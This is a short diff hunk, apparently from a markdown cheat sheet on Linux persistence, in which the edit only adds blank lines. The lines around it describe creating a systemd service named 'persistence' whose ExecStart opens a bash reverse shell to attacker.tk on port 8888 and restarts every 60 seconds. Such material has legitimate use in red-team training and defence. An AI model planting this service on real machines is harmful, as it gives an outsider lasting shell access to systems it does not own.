@@ -93,10 +93,15 @@
 * Service
 
 `bash#> vim /etc/systemd/system/persistence.service`
+
 `bash$> vim ~/.config/systemd/user/persistence.service`
+
 `[Unit]`
+
 `Description=persistence`
+
 `[Service]`
+
 `ExecStart=/bin/bash ‐c 'bash ‐i >& /dev/tcp/attacker.tk/8888 0>&1'`
 `Restart=always`
 `RestartSec=60`
